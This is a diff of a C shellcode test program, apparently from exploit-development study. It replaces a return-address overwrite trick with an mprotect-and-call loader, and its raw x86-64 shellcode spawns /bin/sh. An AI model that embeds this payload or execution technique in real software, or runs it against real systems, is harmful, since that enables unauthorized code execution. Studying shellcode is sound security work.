@@ -1,17 +1,13 @@
-#include <stdio.h>
-#include <string.h>
 #include <stdint.h>
+#include <sys/mman.h>
 
+char code[] = "\xeb\x1f\x5e\xb8\x3b\x00\x00\x00\x48\x89\xf7\xbe\x00\x00\x00\x00"
+              "\xba\x00\x00\x00\x00\x0f\x05\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f"
+              "\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
 
-char shellcode[] = {
-0xeb, 0x15, 0x5e, 0xb8, 0x3b, 0x00, 0x00, 0x00,
-0x48, 0x89, 0xf7, 0xbe, 0x00, 0x00, 0x00, 0x00,
-0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8,
-0xe6, 0xff, 0xff, 0xff, 0x2f, 0x62, 0x69, 0x6e,
-0x2f, 0x73, 0x68, 0x00 };
-
-void main() {
-    uint64_t *ret;
-    ret = (uint64_t*)&ret + 2;
-    (*ret) = (uint64_t)shellcode;
+int main() {
+  // mprotect is needed to make the zone in which code resides executable
+  mprotect((void *)((uint64_t)code & ~4095), 4096, PROT_READ | PROT_EXEC);
+  (*(void (*)())code)();
+  return 0;
 }
